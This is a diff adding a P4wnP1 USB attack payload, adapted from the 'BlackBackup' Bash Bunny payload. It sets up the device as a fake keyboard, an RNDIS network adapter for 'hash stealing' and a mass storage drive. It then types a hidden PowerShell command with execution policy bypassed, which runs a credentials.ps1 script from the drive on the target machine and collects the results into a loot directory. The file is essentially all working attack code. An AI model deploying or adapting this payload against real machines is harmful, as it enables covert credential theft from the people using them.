@@ -1,0 +1,64 @@
+#    This file is part of P4wnP1.
+#
+#    Copyright (c) 2017, Marcus Mengs. 
+#
+#    P4wnP1 is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    P4wnP1 is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.
+
+
+# P4wnP1 payload adopted by BlackBackup Bash Bunny Payload.
+# ==========================
+#
+
+# create Loot Directory
+
+sudo mkdir $LOOTDIR/BlackBackup
+
+sudo umount /mnt/usb
+
+# =============================
+# USB setup
+# =============================
+USB_VID="0x1d6b"    # Vendor ID
+USB_PID="0x1002"    # Product ID
+USE_ECM=false       # we need no Linux/Mac networking
+USE_RNDIS=true      # RNDIS network device to enable hash stealing
+USE_HID=true        # HID keyboard to allow entering cracked password
+USE_UMS=true # enable USB Mass Storage
+
+# Keyboard language for outhid and duckhid commands
+# possible languages: "be", "br", "ca", "ch", "de", "dk", "es", "fi",
+# 	"fr", "gb", "hr", "it", "no", "pt", "ru", "si", "sv", "tr", "us"
+lang="us" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
+
+function onKeyboardUp()
+{
+	
+	led_blink 1
+	
+	sudo mount /home/pi/P4wnP1/USB_STORAGE/image.bin /mnt/usb
+	
+	# execute DuckyScript responsible for bringing up PowerShell
+	cat $PAYLOADDIR/$SWITCH/ps.duck | duckhid
+	
+	cat <<- EOF | duckhid
+		STRING powershell -windowstyle hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''P4wnP1''').Name+'payloads\\$SWITCH\credentials.ps1')"
+		ENTER
+	EOF
+	
+	sudo umount /mnt/usb
+	
+	led_blink 255
+}
+
+
